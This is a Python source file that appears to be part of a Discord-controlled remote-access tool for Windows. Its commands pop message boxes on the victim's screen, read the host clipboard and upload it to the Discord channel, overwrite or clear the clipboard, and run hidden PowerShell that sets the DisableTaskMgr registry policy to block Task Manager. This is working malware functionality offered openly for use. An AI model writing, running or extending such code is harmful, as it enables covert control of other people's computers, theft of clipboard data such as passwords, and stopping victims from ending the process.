import asyncio,ctypes,pyperclip,os,discord,subprocess
import pyperclip
import os
from discord import Embed
from discord.ext import commands
from discord import Embed
async def alert(ctx, *, args=None):
    if not args or ',' not in args:
        embed = discord.Embed(
            title="Invalid Arguments",
            description="You must provide a message and a title separated by a comma.",
            color=discord.Color.red()
        )
        embed.add_field(
            name="Usage",
            value=".alert <message>, <title>",
            inline=False
        )
        embed.add_field(
            name="Example",
            value=".alert error here, pc is done",
            inline=False
        )
        embed.set_footer(text="ALERT COMMAND")
        await ctx.send(embed=embed)
        return

    msg, title = map(str.strip, args.split(',', 1))

    embed = discord.Embed(
        title=f"Alert: {title}",
        description=msg,
        color=discord.Color.green()
    )
    embed.set_footer(text="ALERT SENT")
    await ctx.send(embed=embed)

    async def show_alert(msg, title):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, ctypes.windll.user32.MessageBoxW, 0, msg, title, 0x30)
            embed = discord.Embed(
                title="Alert Shown",
                description=f"**Title:** {title}\n**Message:** {msg}",
                color=discord.Color.green()
            )
            embed.set_footer(text="ALERT COMMANDS")
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
    asyncio.create_task(show_alert(msg, title))

async def cb(ctx, *, action: str = None):


    content = ctx.message.content.strip()

    if content.startswith(".cb write "):
        text = content[len(".cb write "):].strip()
        if text:
            pyperclip.copy(text)
            await ctx.send(f"Text copied to clipboard: {text}")
        else:
            await ctx.send("Please provide text to write to the clipboard.")
        return

    if content.startswith(".cb get"):
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            clipboard_dir = os.path.expanduser('~/Documents/cb')
            os.makedirs(clipboard_dir, exist_ok=True)
            clipboard_file_path = os.path.join(clipboard_dir, "clipboard.txt")
            with open(clipboard_file_path, "w") as f:
                f.write(clipboard_text)
            await ctx.send(file=discord.File(clipboard_file_path, "clipboard.txt"))
        else:
            await ctx.send("Clipboard is empty.")
        return

    if content.startswith(".cb clear"):
        pyperclip.copy("")
        await ctx.send("Clipboard cleared.")
        return

    if content.startswith(".cb help"):
        embed = Embed(
            title="Clipboard Manipulation Commands",
            description="Manage clipboard contents",
            color=discord.Color.green()
        )
        embed.add_field(name=".cb write <text>", value="Writes the specified text to the clipboard", inline=False)
        embed.add_field(name=".cb get", value="Gets the current clipboard text and saves it in 'clipboard.txt' in your Documents folder", inline=False)
        embed.add_field(name=".cb clear", value="Clears the clipboard content", inline=False)
        embed.add_field(name=".cb help", value="Displays this help message", inline=False)
        await ctx.send(embed=embed)
        return
    await ctx.send("Invalid argument. Try `.cb help` for help.")
async def taskmanagerset(ctx, action: str):
    if action.lower() not in ["enable", "disable"]:
        await ctx.send("Invalid action. Use `enable` or `disable`.")
        return

    try:
        script = (
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 0"
            if action.lower() == "enable"
            else "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'DisableTaskMgr' -Value 1"
        )
        subprocess.run(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
        await ctx.send(f"Task Manager has been {action}d.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Failed to {action} Task Manager: {e}")